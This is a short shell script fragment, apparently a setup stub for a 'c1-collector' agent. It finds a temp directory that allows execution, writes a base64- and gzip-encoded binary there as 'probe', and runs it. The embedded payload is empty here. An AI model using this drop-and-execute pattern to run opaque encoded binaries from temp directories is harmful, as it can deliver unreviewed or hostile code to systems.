case "$(uname -m)" in x86_64) ;; *) exit 69;; esac
for d in /tmp/c1-collector /var/tmp/c1-collector /run/c1-collector; do
 mkdir -m 700 "$d" 2>/dev/null || continue
 printf %s  | base64 -d | gzip -d > "$d/probe"
 chmod 700 "$d/probe"
 if "$d/probe" run 1 true 2>/dev/null; then printf "%s\n" "$d/probe"; exit 0; fi
 rm -f "$d/probe"; rmdir "$d"
done
exit 69
